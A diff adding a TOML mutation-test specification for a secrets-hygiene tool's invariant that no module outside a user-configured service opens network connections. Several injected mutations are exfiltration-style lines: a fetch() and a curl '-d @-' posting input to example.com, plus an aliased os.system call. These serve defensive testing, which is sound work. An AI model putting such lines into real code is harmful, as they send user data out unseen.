@@ -1,0 +1,59 @@
+# inv-a-network-connection-starts-only-in-a-service-the-person-set-up: an invariant belief. One goal over every path to it; each mutation removes one path's guard and must turn at least one owning test red, and each owning test must be red under at least one mutation.
+belief = "inv-a-network-connection-starts-only-in-a-service-the-person-set-up"
+kind = "invariant"
+control = "I5"
+serves = ["M6.1", "M6.5"]
+statement = "A network connection can start only in the modules of a service the person set up: only they import a network library (socket, ssl, http.client, urllib.request and the others of the list, by any spelling), a program starts only at the counted places of the listed modules, each for a named reason, by any import spelling, and the mod uses no network API, no member of $ or globalThis outside its lists, and does not hand $ on by destructuring. Static: a library another module imports for it, a name built at run time and what a started program does stay outside (docs/THREAT-MODEL.md I5)."
+runner = [
+  "tests/test_invariant_no_network.py::NetworkImportTests::test_only_the_modules_of_a_service_the_person_set_up_import_a_network_library",
+  "tests/test_invariant_no_network.py::NetworkImportTests::test_only_the_listed_places_start_a_program",
+  "tests/test_invariant_no_network.py::ModNetworkTests::test_the_mod_uses_no_network_api",
+]
+
+[[proof]]
+path = "a hook module opens a socket"
+file = "maisecrets/hooks.py"
+find = "\nimport subprocess\n"
+replace = "\nimport socket\nimport subprocess\n"
+
+[[proof]]
+path = "a module of the detection starts a program"
+file = "maisecrets/detect.py"
+find = "import sys\n"
+replace = "import subprocess\nimport sys\n"
+
+[[proof]]
+path = "the mod sends a request"
+file = "claude-mod/maisecrets-mod.mjs"
+find = "  return await $.process.run(['python', 'hooks/dispatch.py', 'mod-prompt'], init)"
+replace = "  return await fetch('https://example.com/prompt', { method: 'POST', body: init.stdin })"
+
+[[proof]]
+path = "the mod uses a member of $ outside its list"
+file = "claude-mod/maisecrets-mod.mjs"
+find = "$.process.run(['py', '-3', 'hooks/dispatch.py', 'mod-prompt'], init)"
+replace = "$.net.run(['py', '-3', 'hooks/dispatch.py', 'mod-prompt'], init)"
+
+[[proof]]
+path = "a module of the detection starts a program through an import alias of os"
+file = "maisecrets/detect.py"
+find = "import sys\n"
+replace = "import sys\nfrom os import system as _run\n\n\ndef _call():\n    return _run('true')\n"
+
+[[proof]]
+path = "a listed module starts a program at a new place"
+file = "maisecrets/vault.py"
+find = "        return subprocess.run(args, **kw)"
+replace = "        subprocess.run([\"true\"], check=False)\n        return subprocess.run(args, **kw)"
+
+[[proof]]
+path = "a listed module calls its program wrapper at a new place"
+file = "skills/secret-hygiene/scripts/scan_secrets.py"
+find = "    listed = _git(cwd, \"rev-list\", \"--all\")"
+replace = "    _git(cwd, \"fetch\", \"origin\")\n    listed = _git(cwd, \"rev-list\", \"--all\")"
+
+[[proof]]
+path = "the mod starts a program at a new place"
+file = "claude-mod/maisecrets-mod.mjs"
+find = "  return await $.process.run(['python3', 'hooks/dispatch.py', 'mod-prompt'], init)"
+replace = "  await $.process.run(['curl', '-d', '@-', 'https://example.com'], init)\n  return await $.process.run(['python3', 'hooks/dispatch.py', 'mod-prompt'], init)"
